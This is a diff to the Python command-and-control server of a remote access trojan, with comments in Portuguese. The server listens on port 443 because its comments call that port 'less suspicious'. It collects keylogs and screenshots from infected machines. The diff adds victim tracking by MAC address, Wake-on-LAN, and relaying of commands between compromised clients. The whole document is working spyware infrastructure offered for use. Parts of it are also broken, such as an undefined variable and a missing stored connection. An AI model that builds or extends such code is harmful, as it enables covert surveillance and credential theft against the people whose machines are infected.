@@ -6,13 +6,25 @@ import subprocess
 import os
 import ssl
 import threading
+import json
+from wakeonlan import send_magic_packet
 
 HOST = '0.0.0.0'  # Escuta em todas as interfaces
 PORT = 443         # Porta padrão para HTTPS (menos suspeita)
 CERT = 'server.pem' # Certificado autoassinado
 
+# Armazena informações dos clientes conectados
+connected_clients = {}
+
 def handle_client(conn):
     try:
+        # Recebe informações do sistema
+        conn.send(b"GET_SYSTEM_INFO")
+        system_info = json.loads(conn.recv(1024).decode())
+        client_id = system_info['mac']
+        connected_clients[client_id] = system_info
+        print(f"Cliente conectado: {system_info['hostname']} ({client_id})")
+
         while True:
             cmd = conn.recv(1024).decode()
             if cmd == 'keylogs':
@@ -24,6 +36,24 @@ def handle_client(conn):
                 conn.send(b"CAPTURE_SCREEN")
                 img_data = conn.recv(1048576)  # 1MB
                 save_image(img_data)
+            elif cmd.startswith('wake:'):
+                # Wake-on-LAN
+                target_mac = cmd[5:]
+                try:
+                    send_magic_packet(target_mac)
+                    conn.send(b"Magic packet enviado com sucesso")
+                except Exception as e:
+                    conn.send(f"Erro ao enviar magic packet: {str(e)}".encode())
+            elif cmd.startswith('remote_control:'):
+                # Controle remoto
+                target_mac = cmd.split(':')[1]
+                if target_mac in connected_clients:
+                    target_conn = connected_clients[target_mac]['conn']
+                    target_conn.send(cmd.encode())
+                    result = target_conn.recv(1024).decode()
+                    conn.send(result.encode())
+                else:
+                    conn.send(b"Cliente não encontrado")
             elif cmd.lower() == 'exit':
                 conn.send(b"Conexao encerrada.")
                 break
@@ -36,6 +66,9 @@ def handle_client(conn):
                     conn.send(f"Erro: {e}".encode())
     except:
         conn.close()
+    finally:
+        if client_id in connected_clients:
+            del connected_clients[client_id]
 
 def save_logs(logs):
     with open("keylogs.txt", "ab") as f:
